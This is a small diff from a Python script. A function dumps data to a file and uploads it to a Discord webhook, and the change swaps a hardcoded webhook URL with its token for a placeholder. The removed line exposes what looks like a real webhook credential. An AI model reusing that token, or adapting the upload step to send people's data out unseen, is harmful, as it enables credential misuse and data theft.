@@ -88,7 +88,7 @@ def send_to_discord(data):
             f.writelines(data)
 
         print("🚀 SENDING TO DISCORD WEBHOOK...")
-        webhook_url = 'https://discord.com/api/webhooks/1344682187643027548/dcD-it_jE8SuJv3TlIGJpTsHGfKUd9lRwGGNocMxRHFWmw_ooPwHHLXmJntPhx9ARViY'  # Replace with your webhook URL
+        webhook_url = 'YOUR WEB HOOK'  # Replace with your webhook URL
 
         # Send the file as an attachment
         with open(dump_name, 'rb') as f:
